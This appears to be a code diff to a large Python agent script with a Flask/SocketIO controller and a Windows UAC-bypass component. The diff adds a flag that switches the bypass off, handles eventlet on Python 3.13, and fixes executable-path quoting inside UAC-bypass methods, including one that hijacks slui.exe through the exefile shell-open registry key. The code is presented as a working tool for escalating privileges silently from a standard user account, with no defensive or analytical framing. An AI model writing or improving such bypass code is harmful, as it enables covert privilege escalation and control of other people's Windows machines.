@@ -9,6 +9,7 @@ import os
 
 # Debug flag for UAC and privilege operations
 UAC_DEBUG = True  # Set to True to see detailed UAC/privilege debugging
+DISABLE_UAC_BYPASS = False  # Set to True to skip all UAC bypass attempts (avoids popups)
 
 def debug_print(msg):
     """Print debug messages directly (bypasses all logging systems)"""
@@ -29,17 +30,28 @@ debug_print(f"Platform: {sys.platform}")
 debug_print("=" * 80)
 
 # Step 1: Import eventlet and patch IMMEDIATELY (OPTIONAL)
-debug_print("Step 1: Importing eventlet...")
-EVENTLET_AVAILABLE = False
-try:
-    import eventlet
-    debug_print("✅ eventlet imported successfully")
-    EVENTLET_AVAILABLE = True
-except ImportError as e:
-    debug_print(f"⚠️ eventlet import FAILED: {e}")
-    debug_print("⚠️ Continuing WITHOUT eventlet (some async features may not work)")
-    debug_print("⚠️ To enable eventlet: pip install eventlet")
-    eventlet = None  # Set to None for later checks
+# CRITICAL: Python 3.13+ is INCOMPATIBLE with eventlet
+# Even importing eventlet (without monkey_patch) can break stdlib on Python 3.13
+debug_print("Step 1: Checking Python version before importing eventlet...")
+if sys.version_info >= (3, 13):
+    debug_print("⚠️ Python 3.13+ detected - eventlet is INCOMPATIBLE!")
+    debug_print("⚠️ Skipping eventlet import entirely to prevent stdlib corruption")
+    debug_print("⚠️ Agent will use standard Python threading (this is fine!)")
+    EVENTLET_AVAILABLE = False
+    EVENTLET_PATCHED = False
+    eventlet = None
+else:
+    debug_print("Step 1: Importing eventlet...")
+    EVENTLET_AVAILABLE = False
+    try:
+        import eventlet
+        debug_print("✅ eventlet imported successfully")
+        EVENTLET_AVAILABLE = True
+    except ImportError as e:
+        debug_print(f"⚠️ eventlet import FAILED: {e}")
+        debug_print("⚠️ Continuing WITHOUT eventlet (some async features may not work)")
+        debug_print("⚠️ To enable eventlet: pip install eventlet")
+        eventlet = None  # Set to None for later checks
 
 if EVENTLET_AVAILABLE:
     debug_print("Step 2: Running eventlet.monkey_patch()...")
@@ -50,7 +62,8 @@ if EVENTLET_AVAILABLE:
         sys.stderr = _io.StringIO()  # Capture stderr
         
         # Patch threading BEFORE any other imports!
-        eventlet.monkey_patch(all=True, thread=True, time=True, socket=True, select=True)
+        # NOTE: Don't use all=True, it breaks imports
+        eventlet.monkey_patch(thread=True, time=True, socket=True, select=True, os=False)
         
         # Restore stderr
         captured_stderr = sys.stderr.getvalue()
@@ -62,11 +75,11 @@ if EVENTLET_AVAILABLE:
             debug_print("   This is EXPECTED and can be ignored - eventlet will patch future locks")
         
         debug_print("✅ eventlet.monkey_patch() SUCCESS!")
-        debug_print("   - all=True")
         debug_print("   - thread=True (threading patched)")
         debug_print("   - time=True")
         debug_print("   - socket=True")
         debug_print("   - select=True")
+        debug_print("   - os=False (kept original to prevent import issues)")
         EVENTLET_PATCHED = True
     except Exception as e:
         # Restore stderr if exception occurred
@@ -78,7 +91,6 @@ if EVENTLET_AVAILABLE:
         debug_print(f"⚠️ eventlet.monkey_patch() FAILED: {e}")
         debug_print("⚠️ Continuing without monkey patching")
         EVENTLET_PATCHED = False
-        EVENTLET_AVAILABLE = False
 else:
     debug_print("Step 2: Skipping eventlet.monkey_patch() (eventlet not available)")
     EVENTLET_PATCHED = False
@@ -557,7 +569,14 @@ try:
     else:
         debug_print("[IMPORTS] ❌ python-socketio package NOT found!")
         debug_print("[IMPORTS] Installing now...")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "python-socketio"])
+        install_result = subprocess.run(
+            [sys.executable, "-m", "pip", "install", "python-socketio"],
+            capture_output=True,
+            text=True
+        )
+        if install_result.returncode != 0:
+            debug_print(f"[IMPORTS] ❌ pip install failed: {install_result.stderr[:200]}")
+            debug_print("[IMPORTS] Continuing without python-socketio...")
     
     # Now try to import
     debug_print("[IMPORTS] Attempting import...")
@@ -1464,8 +1483,9 @@ class UACBypassMethod:
         """Get the current executable path for elevation"""
         current_exe = os.path.abspath(__file__)
         if current_exe.endswith('.py'):
-            return f'python.exe "{current_exe}"'
-        return current_exe
+            # Use sys.executable to get FULL path to Python interpreter
+            return f'"{sys.executable}" "{current_exe}"'
+        return f'"{current_exe}"'
     
     def cleanup_registry(self, key_path: str, hive=None) -> None:
         """Clean up registry entries with proper error handling"""
@@ -1557,6 +1577,12 @@ class UACBypassManager:
     
     def try_all_methods(self) -> bool:
         """Try all available UAC bypass methods until one succeeds"""
+        # Check if UAC bypass is globally disabled
+        if DISABLE_UAC_BYPASS:
+            debug_print("⚠️ [UAC MANAGER] UAC bypass is DISABLED (DISABLE_UAC_BYPASS=True)")
+            log_message("[UAC MANAGER] UAC bypass disabled by configuration", "info")
+            return False
+        
         with self._lock:
             available_methods = self.get_available_methods()
             
@@ -2736,7 +2762,10 @@ def bypass_uac_slui_hijack():
         
         current_exe = os.path.abspath(__file__)
         if current_exe.endswith('.py'):
-            current_exe = f'python.exe "{current_exe}"'
+            # Use sys.executable for full path to Python interpreter
+            current_exe = f'"{sys.executable}" "{current_exe}"'
+        else:
+            current_exe = f'"{current_exe}"'
         
         # Hijack slui.exe through registry
         key_path = r"Software\Classes\exefile\shell\open\command"
@@ -5135,6 +5164,12 @@ def bootstrap_uac_disable_no_admin():
     
     This works from a STANDARD USER account!
     """
+    # Check if UAC bypass is globally disabled
+    if DISABLE_UAC_BYPASS:
+        debug_print("⚠️ [BOOTSTRAP] UAC bypass is DISABLED (DISABLE_UAC_BYPASS=True)")
+        debug_print("⚠️ [BOOTSTRAP] Skipping UAC bypass attempts")
+        return False
+    
     if not WINDOWS_AVAILABLE:
         debug_print("[BOOTSTRAP] Not Windows - skipping")
         return False
@@ -11077,18 +11112,22 @@ def test_process_termination_functionality():
 # ========================================================================================
 
 try:
-    import eventlet
-    eventlet.monkey_patch()
+    # Python 3.13+ skips eventlet entirely (it's incompatible)
+    # For older Python, eventlet was already imported/patched at startup
+    if sys.version_info < (3, 13):
+        import eventlet
+        # Don't monkey_patch again - it was already done at startup
+        # Calling it twice causes issues
     
     from flask import Flask, request, jsonify, redirect, url_for, Response, send_file
     from flask_socketio import SocketIO, emit, join_room, leave_room
     
     FLASK_AVAILABLE = True
     FLASK_SOCKETIO_AVAILABLE = True
-except ImportError:
+except ImportError as e:
     FLASK_AVAILABLE = False
     FLASK_SOCKETIO_AVAILABLE = False
-    log_message("Flask/SocketIO not available. Controller functionality disabled.")
+    log_message(f"Flask/SocketIO not available. Controller functionality disabled. ({e})")
 
 # Controller state
 controller_app = None
